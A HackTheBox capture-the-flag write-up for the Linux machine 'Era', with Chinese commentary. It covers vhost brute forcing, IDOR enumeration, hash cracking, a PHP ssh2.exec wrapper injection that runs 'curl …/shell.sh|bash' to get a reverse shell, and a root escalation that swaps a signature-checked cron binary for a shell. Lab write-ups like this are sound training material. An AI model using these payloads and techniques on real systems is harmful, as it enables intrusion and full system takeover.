---
title: HackTheBox — Era  
date: 2026-01-02 00:00:00 +0800      
categories: [hackthebox machines]          
tags: [hackthebox]         
toc: true                           
comments: false                    
math: false                          
mermaid: false                
---

- **OS**: Linux
- **Difficulty**: Medium

![image-20260214030820423](assets/img/image-20260214030820423.png)

## Service Enumeration

**Port Scan Results**

```
└─$ sudo nmap -Pn 10.10.11.79 -sVC --min-rate 1000
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 13:01 EDT

Nmap scan report for 10.10.11.79
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://era.htb/
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.55 seconds
```

## Initial Access

```bash
└─$ echo '10.10.11.79    era.htb' | sudo tee -a /etc/hosts
[sudo] password for kali: 
10.10.11.79    era.htb
```

首頁沒什麼東西, 直接爆破 VHost

![image-20260214030826675](assets/img/image-20260214030826675.png)

爆破出 file

![image-20260214030829795](assets/img/image-20260214030829795.png)

新增 DNS 紀錄

```bash
└─$ echo '10.10.11.83    file.era.htb' | sudo tee -a /etc/hosts
[sudo] password for kali: 
10.10.11.83    file.era.htb
```

進入 file.era.htb , 目錄爆破發現有 /register.php

![image-20260214030834273](assets/img/image-20260214030834273.png)

註冊帳號 admin:admin

![image-20260214030837252](assets/img/image-20260214030837252.png)

登入後發現檔案上傳點

![image-20260214030841209](assets/img/image-20260214030841209.png)

上傳後拿到 Download Link

![image-20260214030844167](assets/img/image-20260214030844167.png)

burpsuite 嘗試 IDOR 爆破出 id 54,150 下有檔案

![image-20260214030846856](assets/img/image-20260214030846856.png)

下載檔案後在 filedb.sqlite 發現一些用戶的 hash 密碼

![image-20260214030849886](assets/img/image-20260214030849886.png)

hashcat 爆破出 eric:america 跟 yuri:mustang

![image-20260214030852342](assets/img/image-20260214030852342.png)

```bash
└─$ hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt --user --potfile-disable
```

![image-20260214030855376](assets/img/image-20260214030855376.png)

在 download.php 原始碼發現透過參數 `format` admin 有機會 ssrf

![image-20260214030858637](assets/img/image-20260214030858637.png)

更新 `admin_ef01cab31aa` 的 Security Questions

![image-20260214030901318](assets/img/image-20260214030901318.png)

登入 `admin_ef01cab31aa`

![image-20260214030904451](assets/img/image-20260214030904451.png)

利用 ssh2:// wrapper 登入 eric 帳號觸發 RCE

- [https://www.php.net/manual/en/wrappers.ssh2.php](https://www.php.net/manual/en/wrappers.ssh2.php)

![image-20260214030907406](assets/img/image-20260214030907406.png)

payload

```
ssh2.exec://eric:america@localhost:22/curl 10.10.14.95/shell.sh|bash #

# urlencoded
ssh2.exec%3A%2F%2Feric%3Aamerica%40localhost%3A22%2Fcurl%2010.10.14.95%2Fshell.sh%7Cbash%20%23
```

```
└─$ vim shell.sh
```

![image-20260214030910316](assets/img/image-20260214030910316.png)

瀏覽器訪問

```
http://file.era.htb/download.php?id=150&show=true&format=ssh2.exec%3A%2F%2Feric%3Aamerica%40localhost%3A22%2Fcurl%2010.10.14.95%2Fshell.sh|bash%20%23
```

![image-20260214030912942](assets/img/image-20260214030912942.png)

拿到 eric 的 shell

![image-20260214030915589](assets/img/image-20260214030915589.png)

升級成交互式 tty

![image-20260214030918324](assets/img/image-20260214030918324.png)

**user.txt value:**

```
eric@era:~$ cat user.txt
cat user.txt
<REDACTED>
```

## Privilege Escalation

在 `/opt` 下發現有一個 AV monitor

![image-20260214030921609](assets/img/image-20260214030921609.png)

使用 pspy 查看 root 的 process 狀態

- [https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)

```
eric@era:/opt/AV/periodic-checks$ ./pspy64
```

cronjob 會先檢查 monitor 的 .text_sig section, 確保沒有被竄改

![image-20260214030924502](assets/img/image-20260214030924502.png)

用 C 寫一個寫一個 shell

先把 monitor原本的 text_sig dump出來, 再寫入自己的 shell

```
eric@era:/opt/AV/periodic-checks$ cat << EOF > shell.c
> #include <stdlib.h>
> int main() {
> system("curl 10.10.14.95/shell.sh|bash");
> return 0;
> }
> EOF
eric@era:/opt/AV/periodic-checks$ gcc shell.c -o shell
eric@era:/opt/AV/periodic-checks$ objcopy --dump-section .text_sig=text_sig_section.bin /opt/AV/periodic-checks/monitor
eric@era:/opt/AV/periodic-checks$ objcopy --add-section .text_sig=text_sig_section.bin shell
eric@era:/opt/AV/periodic-checks$ rm monitor
eric@era:/opt/AV/periodic-checks$ mv shell monitor
```

拿到 root shell

![image-20260214030927555](assets/img/image-20260214030927555.png)

**root.txt value:**

```
root@era:~# cat root.txt
cat root.txt
<REDACTED>
```
